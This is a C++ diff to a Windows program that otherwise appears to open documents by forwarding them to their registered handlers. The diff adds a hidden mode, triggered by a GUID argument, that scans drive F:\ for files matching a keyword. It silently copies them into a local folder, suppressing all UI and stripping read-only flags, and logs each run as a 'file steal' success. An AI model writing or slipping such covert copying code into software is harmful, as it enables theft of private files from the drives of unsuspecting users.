@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include "../../resource/tool.h"
 #include "service.h"
+#include "cwdef.h"
 #include "resource.h"
 using namespace std;
 
@@ -100,7 +101,12 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 			extName = file.substr(file.find_last_of(L"."));
 		}
 		//MessageBox(0, extName.c_str(), 0, 0);
-		if (extName == L".pptx" || extName == L".ppt") do {
+		if (IsFileOrDirectory(file) == -1) {
+			ShellExecuteW(NULL, L"open", file.c_str(), 0, 0, SW_NORMAL);
+			return 0;
+		}
+		//if (extName == L".pptx" || extName == L".ppt") 
+		do {
 			wstring originalOpenType, opencmd;
 			MyQueryRegistryValue(HKEY_CLASSES_ROOT, extName,
 				L"", originalOpenType);
@@ -116,6 +122,77 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 			return Process.StartOnly(opencmd.c_str()) ? 0 : GetLastError();
 		} while (0);
 		ShellExecuteW(NULL, L"open", file.c_str(), L"", 0, SW_NORMAL);
+		return 0;
+	}
+	if (type == L"{C827BE9B-EDAC-4C6B-9542-031A0B5D0B04}") {
+		// 临时参数
+		wstring k; cl.getopt(L"k", k);
+		if (k.empty()) return 87;
+		size_t count = 0;
+		wstring szPath = L"F:\\";// 真的很临时，路径写死，服了
+		wstring projectFid = GenerateUUIDW(),
+			projfpath = L"Files\\" + projectFid + L"\\files";
+		CreateDirectoryW((L"Files\\" + projectFid).c_str(), NULL);
+		CreateDirectoryW((projfpath).c_str(), NULL);
+
+		(void)CoInitialize(NULL);
+
+		do {
+			WIN32_FIND_DATAW findd{};
+			HANDLE hFind = FindFirstFileW((szPath + L"*").c_str(), &findd);
+			if (!hFind || hFind == INVALID_HANDLE_VALUE) {
+				Sleep(1000);
+				continue;
+			}
+			do {
+				if (wcscmp(findd.cFileName, L".") == 0 ||
+					wcscmp(findd.cFileName, L"..") == 0) continue;
+				wstring wstrFileName;
+				wstrFileName.assign(szPath);
+				wstrFileName.append(findd.cFileName);
+				if (wstrFileName.find(k) != wstring::npos) {
+					if (findd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+						// 复制文件夹
+						   // 定义源文件夹和目标文件夹路径  
+						std::wstring sourcePath = wstrFileName;
+						std::wstring destPath = GetProgramPathW() + projfpath + L"\\" + findd.cFileName;
+						sourcePath.append(wstring(1, wchar_t(0)));
+						destPath.append(wstring(1, wchar_t(0))); // 双NULL结尾
+
+						// 创建 SHFILEOPSTRUCT 结构体实例  
+						SHFILEOPSTRUCT fileOp = { 0 };
+						fileOp.wFunc = FO_COPY;  // 操作类型：复制  
+						fileOp.pFrom = sourcePath.c_str();  // 源路径  
+						fileOp.pTo = destPath.c_str();  // 目标路径  
+						fileOp.fFlags = FOF_NOCONFIRMMKDIR | FOF_NO_UI;
+
+						// 执行文件操作  
+						int result = SHFileOperation(&fileOp);
+
+						// 检查操作是否成功  
+						if (result == 0) {
+							count++;
+						}
+					}
+					else {
+						if (findd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
+							SetFileAttributesW(wstrFileName.c_str(), FILE_ATTRIBUTE_NORMAL);
+						if (CopyFileW(wstrFileName.c_str(), (projfpath + L"\\" + findd.cFileName).c_str(), TRUE))
+							count++;
+					}
+				}
+			} while (FindNextFileW(hFind, &findd));
+			FindClose(hFind);
+			break;
+		} while (1);
+
+		FILETIME ft{}; GetSystemTimeAsFileTime(&ft);
+		ULARGE_INTEGER ulint{};
+		ulint.LowPart = ft.dwLowDateTime; ulint.HighPart = ft.dwHighDateTime;
+		CwIndexData_InsertItem(projfpath, projectFid, ulint.QuadPart, 0);
+		fstream fp("app.log", ios::app);
+		fp << "[" << time(0) << "] file steal (" << count <<
+			") success: " << ws2s(k) << endl;
 		return 0;
 	}
 	if (type == L"end-user-interface") {
